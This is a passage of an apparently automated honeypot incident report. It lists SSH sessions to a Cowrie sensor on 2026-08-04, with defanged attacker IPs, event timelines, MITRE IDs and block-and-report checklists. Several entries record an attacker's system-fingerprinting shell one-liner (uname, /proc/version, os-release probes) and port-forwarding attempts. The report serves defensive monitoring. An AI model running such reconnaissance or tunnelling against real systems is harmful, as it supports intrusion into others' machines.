| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:13:00` | `cowrie.session.connect` |
| `2026-08-04 14:13:00` | `cowrie.client.version` |
| `2026-08-04 14:13:00` | `cowrie.client.kex` |
| `2026-08-04 14:13:02` | `cowrie.login.success` |
| `2026-08-04 14:13:04` | `cowrie.session.params` |
| `2026-08-04 14:13:04` | `cowrie.command.input` |
| `2026-08-04 14:13:04` | `cowrie.command.input` |
| `2026-08-04 14:13:04` | `cowrie.command.input` |
| `2026-08-04 14:13:04` | `cowrie.command.input` |
| `2026-08-04 14:13:04` | `cowrie.command.input` |
| `2026-08-04 14:13:04` | `cowrie.command.success` |
| `2026-08-04 14:13:04` | `cowrie.command.input` |
| `2026-08-04 14:13:04` | `cowrie.command.input` |
| `2026-08-04 14:13:04` | `cowrie.command.input` |
| `2026-08-04 14:13:04` | `cowrie.command.input` |
| `2026-08-04 14:13:04` | `cowrie.log.closed` |
| `2026-08-04 14:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd8a25d66b9f

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]90` |
| **First Seen** | 2026-08-04 14:13 |
| **Last Seen** | 2026-08-04 14:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:13:58` | `cowrie.session.connect` |
| `2026-08-04 14:13:58` | `cowrie.client.version` |
| `2026-08-04 14:13:58` | `cowrie.client.kex` |
| `2026-08-04 14:13:58` | `cowrie.login.success` |
| `2026-08-04 14:13:58` | `cowrie.direct-tcpip.request` |
| `2026-08-04 14:13:58` | `cowrie.direct-tcpip.data` |
| `2026-08-04 14:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]90` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e65f9b1df17f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:14 |
| **Last Seen** | 2026-08-04 14:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:14:21` | `cowrie.session.connect` |
| `2026-08-04 14:14:21` | `cowrie.client.version` |
| `2026-08-04 14:14:21` | `cowrie.client.kex` |
| `2026-08-04 14:14:21` | `cowrie.login.success` |
| `2026-08-04 14:14:22` | `cowrie.session.params` |
| `2026-08-04 14:14:22` | `cowrie.command.input` |
| `2026-08-04 14:14:22` | `cowrie.log.closed` |
| `2026-08-04 14:14:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad9dea668bc6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 14:14 |
| **Last Seen** | 2026-08-04 14:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:14:29` | `cowrie.session.connect` |
| `2026-08-04 14:14:29` | `cowrie.client.version` |
| `2026-08-04 14:14:29` | `cowrie.client.kex` |
| `2026-08-04 14:14:30` | `cowrie.login.success` |
| `2026-08-04 14:14:32` | `cowrie.session.params` |
| `2026-08-04 14:14:32` | `cowrie.command.input` |
| `2026-08-04 14:14:32` | `cowrie.command.input` |
| `2026-08-04 14:14:32` | `cowrie.command.input` |
| `2026-08-04 14:14:32` | `cowrie.command.input` |
| `2026-08-04 14:14:32` | `cowrie.command.input` |
| `2026-08-04 14:14:32` | `cowrie.command.success` |
| `2026-08-04 14:14:32` | `cowrie.command.input` |
| `2026-08-04 14:14:32` | `cowrie.command.input` |
| `2026-08-04 14:14:32` | `cowrie.command.input` |
| `2026-08-04 14:14:32` | `cowrie.command.input` |
| `2026-08-04 14:14:33` | `cowrie.log.closed` |
| `2026-08-04 14:14:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8bcde099f7b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 14:15 |
| **Last Seen** | 2026-08-04 14:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:15:48` | `cowrie.session.connect` |
| `2026-08-04 14:15:48` | `cowrie.client.version` |
| `2026-08-04 14:15:48` | `cowrie.client.kex` |
| `2026-08-04 14:15:48` | `cowrie.login.success` |
| `2026-08-04 14:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d4c68d005d0

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 14:15 |
| **Last Seen** | 2026-08-04 14:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:15:48` | `cowrie.session.connect` |
| `2026-08-04 14:15:48` | `cowrie.client.version` |
| `2026-08-04 14:15:48` | `cowrie.client.kex` |
| `2026-08-04 14:15:48` | `cowrie.login.success` |
| `2026-08-04 14:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e873c3073c59

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 14:15 |
| **Last Seen** | 2026-08-04 14:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:15:48` | `cowrie.session.connect` |
| `2026-08-04 14:15:48` | `cowrie.client.version` |
| `2026-08-04 14:15:48` | `cowrie.client.kex` |
| `2026-08-04 14:15:48` | `cowrie.login.success` |
| `2026-08-04 14:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a7e847a8aae

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 14:15 |
| **Last Seen** | 2026-08-04 14:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:15:48` | `cowrie.session.connect` |
| `2026-08-04 14:15:48` | `cowrie.client.version` |
| `2026-08-04 14:15:48` | `cowrie.client.kex` |
| `2026-08-04 14:15:48` | `cowrie.login.success` |
| `2026-08-04 14:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31a040e5214c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 14:15 |
| **Last Seen** | 2026-08-04 14:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:15:57` | `cowrie.session.connect` |
| `2026-08-04 14:15:57` | `cowrie.client.version` |
| `2026-08-04 14:15:57` | `cowrie.client.kex` |
| `2026-08-04 14:15:59` | `cowrie.login.success` |
| `2026-08-04 14:16:01` | `cowrie.session.params` |
| `2026-08-04 14:16:01` | `cowrie.command.input` |
| `2026-08-04 14:16:01` | `cowrie.command.input` |
| `2026-08-04 14:16:01` | `cowrie.command.input` |
| `2026-08-04 14:16:01` | `cowrie.command.input` |
| `2026-08-04 14:16:01` | `cowrie.command.input` |
| `2026-08-04 14:16:01` | `cowrie.command.success` |
| `2026-08-04 14:16:01` | `cowrie.command.input` |
| `2026-08-04 14:16:01` | `cowrie.command.input` |
| `2026-08-04 14:16:01` | `cowrie.command.input` |
| `2026-08-04 14:16:01` | `cowrie.command.input` |
| `2026-08-04 14:16:02` | `cowrie.log.closed` |
| `2026-08-04 14:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b75a0a8aae2

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:15 |
| **Last Seen** | 2026-08-04 14:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:15:59` | `cowrie.session.connect` |
| `2026-08-04 14:15:59` | `cowrie.client.version` |
| `2026-08-04 14:16:00` | `cowrie.client.kex` |
| `2026-08-04 14:16:00` | `cowrie.login.success` |
| `2026-08-04 14:16:01` | `cowrie.session.params` |
| `2026-08-04 14:16:01` | `cowrie.command.input` |
| `2026-08-04 14:16:01` | `cowrie.log.closed` |
| `2026-08-04 14:16:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d235f699c3ce

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 14:17 |
| **Last Seen** | 2026-08-04 14:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:17:30` | `cowrie.session.connect` |
| `2026-08-04 14:17:30` | `cowrie.client.version` |
| `2026-08-04 14:17:30` | `cowrie.client.kex` |
| `2026-08-04 14:17:31` | `cowrie.login.success` |
| `2026-08-04 14:17:33` | `cowrie.session.params` |
| `2026-08-04 14:17:33` | `cowrie.command.input` |
| `2026-08-04 14:17:33` | `cowrie.command.input` |
| `2026-08-04 14:17:33` | `cowrie.command.input` |
| `2026-08-04 14:17:33` | `cowrie.command.input` |
| `2026-08-04 14:17:33` | `cowrie.command.input` |
| `2026-08-04 14:17:33` | `cowrie.command.success` |
| `2026-08-04 14:17:33` | `cowrie.command.input` |
| `2026-08-04 14:17:33` | `cowrie.command.input` |
| `2026-08-04 14:17:33` | `cowrie.command.input` |
| `2026-08-04 14:17:33` | `cowrie.command.input` |
| `2026-08-04 14:17:33` | `cowrie.log.closed` |
| `2026-08-04 14:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ac1da8e8d83

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:17 |
| **Last Seen** | 2026-08-04 14:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:17:43` | `cowrie.session.connect` |
| `2026-08-04 14:17:43` | `cowrie.client.version` |
| `2026-08-04 14:17:43` | `cowrie.client.kex` |
| `2026-08-04 14:17:43` | `cowrie.login.success` |
| `2026-08-04 14:17:44` | `cowrie.session.params` |
| `2026-08-04 14:17:44` | `cowrie.command.input` |
| `2026-08-04 14:17:45` | `cowrie.log.closed` |
| `2026-08-04 14:17:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a58c4691d9ea

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 14:18 |
| **Last Seen** | 2026-08-04 14:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:18:58` | `cowrie.session.connect` |
| `2026-08-04 14:18:58` | `cowrie.client.version` |
| `2026-08-04 14:18:58` | `cowrie.client.kex` |
| `2026-08-04 14:19:00` | `cowrie.login.success` |
| `2026-08-04 14:19:02` | `cowrie.session.params` |
| `2026-08-04 14:19:02` | `cowrie.command.input` |
| `2026-08-04 14:19:02` | `cowrie.command.input` |
| `2026-08-04 14:19:02` | `cowrie.command.input` |
| `2026-08-04 14:19:02` | `cowrie.command.input` |
| `2026-08-04 14:19:02` | `cowrie.command.input` |
| `2026-08-04 14:19:02` | `cowrie.command.success` |
| `2026-08-04 14:19:02` | `cowrie.command.input` |
| `2026-08-04 14:19:02` | `cowrie.command.input` |
| `2026-08-04 14:19:02` | `cowrie.command.input` |
| `2026-08-04 14:19:02` | `cowrie.command.input` |
| `2026-08-04 14:19:02` | `cowrie.log.closed` |
| `2026-08-04 14:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdf7286ddc21

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:19 |
| **Last Seen** | 2026-08-04 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:19:32` | `cowrie.session.connect` |
| `2026-08-04 14:19:32` | `cowrie.client.version` |
| `2026-08-04 14:19:32` | `cowrie.client.kex` |
| `2026-08-04 14:19:32` | `cowrie.login.success` |
| `2026-08-04 14:19:33` | `cowrie.session.params` |
| `2026-08-04 14:19:33` | `cowrie.command.input` |
| `2026-08-04 14:19:33` | `cowrie.log.closed` |
| `2026-08-04 14:19:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d5066f63cd6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:21 |
| **Last Seen** | 2026-08-04 14:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:21:15` | `cowrie.session.connect` |
| `2026-08-04 14:21:15` | `cowrie.client.version` |
| `2026-08-04 14:21:15` | `cowrie.client.kex` |
| `2026-08-04 14:21:15` | `cowrie.login.success` |
| `2026-08-04 14:21:16` | `cowrie.session.params` |
| `2026-08-04 14:21:16` | `cowrie.command.input` |
| `2026-08-04 14:21:16` | `cowrie.log.closed` |
| `2026-08-04 14:21:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede138db8fc6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:22 |
| **Last Seen** | 2026-08-04 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:22:58` | `cowrie.session.connect` |
| `2026-08-04 14:22:58` | `cowrie.client.version` |
| `2026-08-04 14:22:58` | `cowrie.client.kex` |
| `2026-08-04 14:22:58` | `cowrie.login.success` |
| `2026-08-04 14:22:59` | `cowrie.session.params` |
| `2026-08-04 14:22:59` | `cowrie.command.input` |
| `2026-08-04 14:22:59` | `cowrie.log.closed` |
| `2026-08-04 14:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577e12b5d9d1

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]234` |
| **First Seen** | 2026-08-04 14:24 |
| **Last Seen** | 2026-08-04 14:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:24:03` | `cowrie.session.connect` |
| `2026-08-04 14:24:03` | `cowrie.client.version` |
| `2026-08-04 14:24:03` | `cowrie.client.kex` |
| `2026-08-04 14:24:04` | `cowrie.login.success` |
| `2026-08-04 14:24:04` | `cowrie.direct-tcpip.request` |
| `2026-08-04 14:24:04` | `cowrie.direct-tcpip.data` |
| `2026-08-04 14:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]234` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf01cd3a6c39

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-04 14:24 |
| **Last Seen** | 2026-08-04 14:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:24:35` | `cowrie.session.connect` |
| `2026-08-04 14:24:35` | `cowrie.client.version` |
| `2026-08-04 14:24:35` | `cowrie.client.kex` |
| `2026-08-04 14:24:35` | `cowrie.login.success` |
| `2026-08-04 14:24:35` | `cowrie.direct-tcpip.request` |
| `2026-08-04 14:24:35` | `cowrie.direct-tcpip.data` |
| `2026-08-04 14:24:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd6b5d1691ce

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:24 |
| **Last Seen** | 2026-08-04 14:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:24:41` | `cowrie.session.connect` |
| `2026-08-04 14:24:41` | `cowrie.client.version` |
| `2026-08-04 14:24:41` | `cowrie.client.kex` |
| `2026-08-04 14:24:42` | `cowrie.login.success` |
| `2026-08-04 14:24:43` | `cowrie.session.params` |
| `2026-08-04 14:24:43` | `cowrie.command.input` |
| `2026-08-04 14:24:43` | `cowrie.log.closed` |
| `2026-08-04 14:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99933887cd9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:26 |
| **Last Seen** | 2026-08-04 14:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:26:22` | `cowrie.session.connect` |
| `2026-08-04 14:26:22` | `cowrie.client.version` |
| `2026-08-04 14:26:22` | `cowrie.client.kex` |
| `2026-08-04 14:26:23` | `cowrie.login.success` |
| `2026-08-04 14:26:24` | `cowrie.session.params` |
| `2026-08-04 14:26:24` | `cowrie.command.input` |
| `2026-08-04 14:26:24` | `cowrie.log.closed` |
| `2026-08-04 14:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0724aed5aa62

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:27 |
| **Last Seen** | 2026-08-04 14:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:27:59` | `cowrie.session.connect` |
| `2026-08-04 14:27:59` | `cowrie.client.version` |
| `2026-08-04 14:27:59` | `cowrie.client.kex` |
| `2026-08-04 14:28:00` | `cowrie.login.success` |
| `2026-08-04 14:28:00` | `cowrie.session.params` |
| `2026-08-04 14:28:00` | `cowrie.command.input` |
| `2026-08-04 14:28:01` | `cowrie.log.closed` |
| `2026-08-04 14:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
